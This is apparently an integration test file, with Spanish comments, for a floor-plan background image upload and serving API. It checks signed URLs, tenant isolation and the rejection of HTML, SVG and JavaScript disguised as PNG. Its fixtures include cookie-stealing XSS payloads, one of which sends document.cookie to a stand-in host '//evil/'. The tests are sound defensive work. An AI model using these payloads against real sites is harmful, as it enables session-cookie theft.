import { randomUUID } from 'node:crypto';
import { writeFile } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import request from 'supertest';
import { bootstrapTestApp, type TestContext } from './harness';
import { CONCEPTS } from '../../src/common';
import { loadStorageEnv } from '../../src/common/storage/storage.env';
import { makePngForTest } from '../../src/modules/practice/plan/plan-background-guard.testing';
import {
  como,
  comoDueno,
  createPlainMember,
  createSpace,
  ifMatch,
  registerOrg,
  sql,
  uploadImage,
  type PlanOrg,
} from './plan-fixtures';

const HTML = '<!doctype html><script>fetch("/x?c="+document.cookie)</script>';
const SVG = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';

/**
 * F1c · Plano de planta · fondo importado (CONTRATO-PLANO §1.6), contra la base y
 * el almacenamiento reales.
 *
 * Lo central: el tipo de lo que se sirve sale **del contenido**, nunca del MIME
 * declarado. Como el endpoint de subida ya rechaza lo que no es imagen, las
 * pruebas de HTML/SVG/JS «renombrado .png» alteran los bytes guardados después
 * de subir (el caso de un archivo que cambia entre la validación y la lectura).
 */
describe('Infraestructura F1c · plano · fondo calibrado', () => {
  let ctx: TestContext;
  const http = () => request(ctx.app.getHttpServer());
  const sufijo = randomUUID().slice(0, 8);
  let org: PlanOrg;
  let otra: PlanOrg;
  let plan: any;

  const filas = (text: string, params: unknown[] = []) => sql<any>(ctx, text, params);

  /** Sube una imagen propia y única (el almacenamiento es por contenido). */
  let semilla = 0;
  async function subirPng(o: PlanOrg = org, w = 100, h = 50) {
    semilla += 1;
    const png = makePngForTest(w + semilla, h);
    const up = await uploadImage(ctx, o.token, o.tenantId, png, `plano-${semilla}.png`, 'image/png');
    expect(up.status).toBe(201);
    return { id: up.id as string, png };
  }

  /** Reescribe los bytes guardados de un archivo (simula contenido distinto al validado). */
  async function alterarBytes(fileId: string, contenido: string): Promise<void> {
    const [v] = await filas(
      `select v.storage_uri from common.file_versions v join common.files f on f.current_version_id = v.id where f.id = ?`,
      [fileId],
    );
    const hash = String(v.storage_uri).split('/').pop() as string;
    const root = resolve(loadStorageEnv().localDir);
    await writeFile(join(root, hash.slice(0, 2), hash), contenido);
  }

  const calibracion = {
    calibration: { p1: { px: 0, py: 0 }, p2: { px: 100, py: 0 }, distanceM: 10 },
    offsetXM: 1,
    offsetYM: 2,
    rotationDeg: 0,
    opacity: 0.6,
  };

  const fijar = (fileId: string, body: Record<string, unknown> = calibracion, rowVersion?: number, o = org) =>
    http()
      .put(`/floor-plans/${plan.id}/background`)
      .set(como(o.token, o.tenantId))
      .set(ifMatch(rowVersion ?? plan.rowVersion))
      .send({ fileId, ...body });

  const plano = async () =>
    (await http().get(`/floor-plans/${plan.id}`).set(comoDueno(org)).expect(200)).body;

  beforeAll(async () => {
    ctx = await bootstrapTestApp();
    org = await registerOrg(ctx, 'G', sufijo);
    otra = await registerOrg(ctx, 'H', sufijo);
    const edif = await createSpace(ctx, org, {
      code: 'EDIF-F',
      name: 'Edificio',
      formCode: 'LOC_FORM_BUILDING',
      functionCode: 'SPACE_FN_BUILDING_GENERIC',
    });
    const piso = await createSpace(ctx, org, {
      code: 'PISO-F',
      name: 'Piso',
      formCode: 'LOC_FORM_LEVEL',
      functionCode: 'SPACE_FN_LEVEL_GENERIC',
      parentSpaceId: edif.id,
    });
    plan = (
      await http()
        .post(`/sites/${org.siteId}/floor-plans`)
        .set(comoDueno(org))
        .send({ code: 'FONDO-1', name: 'Con fondo', anchorSpaceId: piso.id, widthM: 40, heightM: 20 })
        .expect(201)
    ).body;
  });

  afterAll(async () => {
    await ctx.app.close();
  });

  it('importar un PNG y calibrarlo con dos puntos: la API entrega una URL firmada, nunca el id del archivo', async () => {
    const { id, png } = await subirPng();
    const res = await fijar(id).expect(200);
    plan = res.body;
    expect(plan.rowVersion).toBe(2);
    expect(plan.layoutVersion).toBe(2); // el fondo es parte del layout
    expect(plan.background).toMatchObject({
      scaleMPerPx: 0.1,
      offsetXM: 1,
      offsetYM: 2,
      opacity: 0.6,
      url: expect.stringMatching(new RegExp(`^/floor-plans/${plan.id}/background/content\\?v=`)),
    });
    expect(res.body.image).toMatchObject({ mimeType: 'image/png', height: 50 });
    expect(JSON.stringify(res.body)).not.toContain(id);

    const bytes = await http().get(plan.background.url).set(comoDueno(org)).expect(200);
    expect(bytes.headers['content-type']).toMatch(/^image\/png/);
    expect(bytes.headers['x-content-type-options']).toBe('nosniff');
    expect(bytes.headers['content-security-policy']).toBe("default-src 'none'; sandbox");
    expect(bytes.headers['cache-control']).toMatch(/^private, max-age=/);
    expect(Buffer.compare(bytes.body, png)).toBe(0);
    // Queda en la historia y en el outbox.
    const ev = await filas(
      `select payload_json->>'change' as c from messaging.domain_events where aggregate_id = ? and event_type = 'practice.floor_plan.background_changed'`,
      [plan.id],
    );
    expect(ev).toEqual([{ c: 'SET' }]);
    // El layout también la entrega.
    const layout = await http().get(`/floor-plans/${plan.id}/layout`).set(comoDueno(org)).expect(200);
    expect(layout.body.floorPlan.background.url).toContain('/background/content?');
  });

  it('la URL exige sesión y lectura de la sede: sin token 401, otro tenant 404, firma alterada 403', async () => {
    const url = (await plano()).background.url as string;
    await http().get(url).expect(401);
    await http().get(url).set(comoDueno(otra)).expect(404);
    const mala = url.replace(/sig=[0-9a-f]{64}/, `sig=${'0'.repeat(64)}`);
    const res = await http().get(mala).set(comoDueno(org)).expect(403);
    expect(res.body.reason).toBe('BACKGROUND_URL_INVALID');
    const vencida = url.replace(/exp=\d+/, 'exp=1000000000');
    await http().get(vencida).set(comoDueno(org)).expect(403); // la firma ya no coincide
  });

  it('calibración inválida: puntos iguales, escala y calibración a la vez, distancia 0 → 422', async () => {
    const { id } = await subirPng();
    const rv = (await plano()).rowVersion;
    for (const body of [
      { calibration: { p1: { px: 5, py: 5 }, p2: { px: 5, py: 5 }, distanceM: 10 } },
      { calibration: calibracion.calibration, scaleMPerPx: 0.1 },
      { calibration: { p1: { px: 0, py: 0 }, p2: { px: 10, py: 0 }, distanceM: 0 } },
      {},
      { scaleMPerPx: 5000 },
    ]) {
      const res = await fijar(id, body, rv).expect(422);
      expect(res.body.reason).toBe('BACKGROUND_CALIBRATION_INVALID');
    }
    await fijar(id, { scaleMPerPx: 0.05 }, rv - 1).expect(412);
  });

  it('archivo de otro tenant: 404 sin revelar que existe; archivo propio que no es imagen: 422', async () => {
    const ajeno = await subirPng(otra);
    const res = await fijar(ajeno.id).expect(404);
    expect(JSON.stringify(res.body)).not.toContain(ajeno.id);
    const doc = await uploadImage(
      ctx,
      org.token,
      org.tenantId,
      makePngForTest(30, 30),
      'doc.png',
      'image/png',
      'DOCUMENT',
    );
    expect(doc.status).toBe(201);
    const categoria = await fijar(doc.id as string).expect(422);
    expect(categoria.body.reason).toBe('BACKGROUND_FILE_INVALID');
    expect(categoria.body.details.cause).toBe('CATEGORY');
    await fijar(randomUUID()).expect(404);
  });

  it.each([
    ['HTML con script', HTML],
    ['SVG con script', SVG],
    ['JavaScript', 'document.location="//evil/?"+document.cookie'],
  ])('al adjuntar: %s declarado como image/png y subido como .png se rechaza', async (_n, contenido) => {
    const { id } = await subirPng();
    await alterarBytes(id, contenido);
    const antes = (await plano()).background;
    const res = await fijar(id, calibracion, (await plano()).rowVersion).expect(422);
    expect(res.body.reason).toBe('BACKGROUND_FILE_INVALID');
    expect(res.body.details.cause).toBe('MIME');
    expect((await plano()).background?.url?.split('?')[0]).toBe(antes?.url?.split('?')[0]);
  });

  it.each([
    ['HTML con script', HTML],
    ['SVG con script', SVG],
  ])('al servir: si los bytes dejan de ser una imagen (%s), la URL firmada no los sirve ni como image/png ni como nada', async (_n, contenido) => {
    const { id } = await subirPng();
    await fijar(id, calibracion, (await plano()).rowVersion).expect(200);
    const url = (await plano()).background.url as string;
    await http().get(url).set(comoDueno(org)).expect(200); // todavía es el PNG
    await alterarBytes(id, contenido);
    const res = await http().get(url).set(comoDueno(org)).expect(422);
    expect(res.body.reason).toBe('BACKGROUND_FILE_INVALID');
    expect(res.headers['content-type']).not.toMatch(/image\/png|html|svg/);
    expect(JSON.stringify(res.body)).not.toContain('<script');
  });

  it('un archivo reemplazado después de adjuntarlo no se sirve bajo la URL firmada vieja', async () => {
    const { id } = await subirPng();
    await fijar(id, calibracion, (await plano()).rowVersion).expect(200);
    const vieja = (await plano()).background.url as string;
    await http().get(vieja).set(comoDueno(org)).expect(200);
    // Nueva versión del mismo archivo (otra imagen válida) como vigente.
    const nueva = makePngForTest(77, 33);
    const up = await uploadImage(ctx, org.token, org.tenantId, nueva, 'nueva.png', 'image/png');
    const [origen] = await filas(
      `select v.* from common.file_versions v join common.files f on f.current_version_id = v.id where f.id = ?`,
      [up.id],
    );
    const nuevaVersion = randomUUID();
    await filas(
      `insert into common.file_versions (id, file_id, version_number, storage_provider_concept_id, storage_region_concept_id,
         storage_uri, mime_type, size_bytes, checksum_algorithm_concept_id, content_hash, encryption_status_concept_id,
         malware_scan_status_concept_id, recorded_at)
       select ?::uuid, ?::uuid, 2, storage_provider_concept_id, storage_region_concept_id, storage_uri, mime_type, size_bytes,
              checksum_algorithm_concept_id, content_hash, encryption_status_concept_id, malware_scan_status_concept_id, now()
         from common.file_versions where id = ?::uuid`,
      [nuevaVersion, id, origen.id],
    );
    await filas('update common.files set current_version_id = ?::uuid where id = ?::uuid', [nuevaVersion, id]);
    const res = await http().get(vieja).set(comoDueno(org)).expect(422);
    expect(res.body.reason).toBe('BACKGROUND_URL_INVALID');
    // El lienzo entrega la URL de la versión vigente, y esa sí sirve.
    const fresca = (await plano()).background.url as string;
    expect(fresca).not.toBe(vieja);
    const ok = await http().get(fresca).set(comoDueno(org)).expect(200);
    expect(Buffer.compare(ok.body, nueva)).toBe(0);
  });

  it('un archivo borrado o infectado deja de entregarse: el lienzo no ofrece URL y el contenido no se sirve', async () => {
    const { id } = await subirPng();
    await fijar(id, calibracion, (await plano()).rowVersion).expect(200);
    const url = (await plano()).background.url as string;
    await filas(
      `update common.file_versions set malware_scan_status_concept_id = ?::uuid
        where id = (select current_version_id from common.files where id = ?::uuid)`,
      [CONCEPTS.SCAN_INFECTED, id],
    );
    expect((await plano()).background).toBeNull();
    await http().get(url).set(comoDueno(org)).expect(422);
    // Volver a limpio y luego borrar el archivo.
    await filas(
      `update common.file_versions set malware_scan_status_concept_id = ?::uuid
        where id = (select current_version_id from common.files where id = ?::uuid)`,
      [CONCEPTS.SCAN_CLEAN, id],
    );
    expect((await plano()).background).not.toBeNull();
    await filas('update common.files set deleted_at = now(), lifecycle_status_concept_id = ?::uuid where id = ?::uuid', [
      CONCEPTS.FILE_DELETED,
      id,
    ]);
    expect((await plano()).background).toBeNull();
    await http().get(url).set(comoDueno(org)).expect(422);
    await fijar(id, calibracion, (await plano()).rowVersion).expect(422);
  });

  it('límites de la práctica: una imagen más ancha que max_px se rechaza', async () => {
    await filas(
      `insert into practice.practice_settings (id, practice_id, setting_key, value_json, created_at, updated_at)
       values (gen_random_uuid(), ?::uuid, 'infra.plan.background.max_px', '50'::jsonb, now(), now())`,
      [org.practiceId],
    );
    const { id } = await subirPng(org, 120, 40);
    const res = await fijar(id, calibracion, (await plano()).rowVersion).expect(422);
    expect(res.body.details).toMatchObject({ cause: 'TOO_LARGE_PX', maxPx: 50 });
    await filas(`delete from practice.practice_settings where practice_id = ?::uuid and setting_key = 'infra.plan.background.max_px'`, [
      org.practiceId,
    ]);
  });

  it('quitar el fondo borra la referencia (el archivo sigue); sin fondo la URL antigua da 404', async () => {
    const { id } = await subirPng();
    await fijar(id, calibracion, (await plano()).rowVersion).expect(200);
    const url = (await plano()).background.url as string;
    const quitado = await http()
      .delete(`/floor-plans/${plan.id}/background`)
      .set(comoDueno(org))
      .set(ifMatch((await plano()).rowVersion))
      .expect(200);
    expect(quitado.body.background).toBeNull();
    const [archivo] = await filas('select deleted_at from common.files where id = ?', [id]);
    expect(archivo.deleted_at).toBeNull();
    await http().get(url).set(comoDueno(org)).expect(404);
    const [{ n }] = await filas(
      `select count(*)::int as n from messaging.domain_events where aggregate_id = ? and payload_json->>'change' = 'CLEARED'`,
      [plan.id],
    );
    expect(n).toBe(1);
  });

  it('sólo quien edita estructura importa el fondo: un miembro recibe 403', async () => {
    const miembro = await createPlainMember(ctx, org, 'fondo');
    const { id } = await subirPng();
    const res = await fijar(id, calibracion, (await plano()).rowVersion, {
      ...org,
      token: miembro.token,
    }).expect(403);
    expect(res.body.reason).toBe('INFRA_ACTION_NOT_ALLOWED');
  });
});
